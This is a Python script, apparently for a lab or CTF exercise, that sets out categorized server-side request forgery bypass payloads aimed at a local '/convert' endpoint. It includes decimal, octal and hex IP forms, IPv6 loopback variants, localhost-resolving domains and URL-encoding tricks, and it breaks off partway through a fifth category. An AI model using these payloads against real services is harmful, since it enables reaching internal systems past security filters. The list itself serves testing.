import requests
import json
import time

# Base URL and endpoint
BASE_URL = "http://127.0.0.1:33181"
CONVERT_ENDPOINT = f"{BASE_URL}/convert"

# Define test payloads by category
ssrf_payloads = {
    "Category 1: Alternative IP Representations": [
        # Decimal
        "http://2130706433",
        "http://2130706433/admin",
        # Octal
        "http://0177.0.0.1",
        "http://0177.0000.0000.0001",
        "http://0x7f.0x0.0x0.0x1",
        # Dword
        "http://127.1",
        "http://127.0.1",
        # Hex
        "http://0x7f.0.0.1",
        "http://0x7f.0.0.0x1",
        "http://0x7f000001",
        # Additional variants
        "http://017700000001",
        "http://3232235777",  # 192.168.1.1 in decimal
        "http://127.0.0.0",
        "http://127.0.0.2",
        "http://127.2.3.4"
    ],
    "Category 2: IPv6 Variants": [
        "http://::1",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        "http://0:0:0:0:0:0:0:1",
        "http://[0:0:0:0:0:0:0:1]",
        "http://[::ffff:7f00:1]",
        "http://[::ffff:7f00:0001]",
        "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
        "http://[::ffff:127.0.0.1]:80",
        "http://[0:0:0:0:0:ffff:127.0.0.1]"
    ],
    "Category 3: DNS-based Bypasses": [
        "http://localhost",
        "http://localtest.me",
        "http://localhost.localdomain",
        "http://127.0.0.1.xip.io",
        "http://1.0.0.127.xip.io",
        "http://127.0.0.1.nip.io",
        # URL Encoded
        "http://127%2e0%2e0%2e1",
        "http://%6C%6F%63%61%6C%68%6F%73%74",
        "http://%6C%6F%63%61%6C%68%6F%73%74/admin",
        # Case variations
        "http://LocalHost",
        "http://LOCALHOST",
        "http://Localhost",
        "http://127.0.0.1@example.com",
        "http://user@127.0.0.1",
        "http://user:pass@127.0.0.1"
    ],
    "Category 4: URL Encoding Tricks": [
        # Fully encoded
        "http://%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31",
        # Partial encoding
        "http://127%2e0%2e0%2e1",
        "http://%31%32%37%2e%30%2e%30%2e%31",
        "http://%31%32%37%2e%30%2e%30%2e%31/admin",
        # Double encoding
        "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",
        "http://localhost%2e%6d%65",
        # Mixed encoding
        "http://%6C%6F%63%61%6C%68%6F%73%74.%6D%65",
        "http://%32%31%33%30%37%30%36%34%33%33",  # Decimal encoding
        "http://%30%78%37%66%2e%30%2e%30%2e%31",   # Hex encoding
        "http://%2F%2Flocalhost"  # Slash encoding
    ],
    "Category 5: Malformed/Abnormal URLs": [
        # With credentials
        "http://user@127.0.0.1",
